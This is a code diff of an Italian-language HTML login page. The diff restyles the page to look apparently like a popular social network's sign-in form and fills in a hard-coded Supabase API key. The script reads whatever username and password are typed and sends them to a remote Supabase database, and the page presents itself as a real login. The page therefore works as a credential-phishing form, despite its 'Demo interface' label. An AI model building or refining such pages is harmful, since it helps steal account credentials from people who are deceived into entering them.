@@ -10,8 +10,8 @@
 <style>
 body {
     margin: 0;
-    font-family: Arial;
     background: #fafafa;
+    font-family: Arial, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -19,27 +19,25 @@ body {
 }
 
 .card {
-    width: 350px;
+    width: 380px;
     background: white;
-    border: 1px solid #ddd;
-    padding: 40px;
+    border: 1px solid #dbdbdb;
+    padding: 50px 40px;
     text-align: center;
     border-radius: 10px;
 }
 
-.title {
-    font-size: 32px;
+.logo {
+    font-size: 40px;
     font-weight: bold;
     margin-bottom: 25px;
-    font-family: Arial;
-    letter-spacing: 1px;
 }
 
 input {
     width: 100%;
     padding: 12px;
     margin: 6px 0;
-    border: 1px solid #ddd;
+    border: 1px solid #dbdbdb;
     border-radius: 6px;
     background: #fafafa;
 }
@@ -61,7 +59,7 @@ button:hover {
 }
 
 .small {
-    margin-top: 10px;
+    margin-top: 15px;
     font-size: 12px;
     color: gray;
 }
@@ -71,28 +69,28 @@ button:hover {
 <body>
 
 <div class="card">
-    <div class="title">Login</div>
 
-    <input id="user" placeholder="Username">
-    <input id="msg" placeholder="Password">
+    <div class="logo">Login</div>
+
+    <input id="user" placeholder="Numero di telefono, email o username">
+    <input id="msg" type="password" placeholder="Password">
 
     <button onclick="send()">Accedi</button>
 
     <div class="small">Demo interface</div>
+
 </div>
 
 <script>
 
-// 🔵 SUPABASE
+// 🔵 SUPABASE CONFIG COMPLETA
 const supabaseUrl = "https://kgtpnhvdnjsmimihguqg.supabase.co";
 
-const supabaseKey = "INCOLLA_LA_TUA_ANON_KEY";
+const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndHBuaHZkbmpzbWltaWhndXFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5NTgxNjEsImV4cCI6MjA5MjUzNDE2MX0.py6zxxMaL3tjPl8o4A5RkMX01K_Qd1ve0OQv1mfwJRk";
 
-const supabase = supabase?.createClient
-    ? supabase.createClient(supabaseUrl, supabaseKey)
-    : window.supabase.createClient(supabaseUrl, supabaseKey);
+const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
-// INVIO
+// INVIO DATI
 async function send() {
     const user = document.getElementById("user").value;
     const msg = document.getElementById("msg").value;
@@ -110,7 +108,7 @@ async function send() {
         console.log(error);
         alert("Errore nel database");
     } else {
-        alert("Salvato!");
+        alert("Dati inviati!");
     }
 }
 
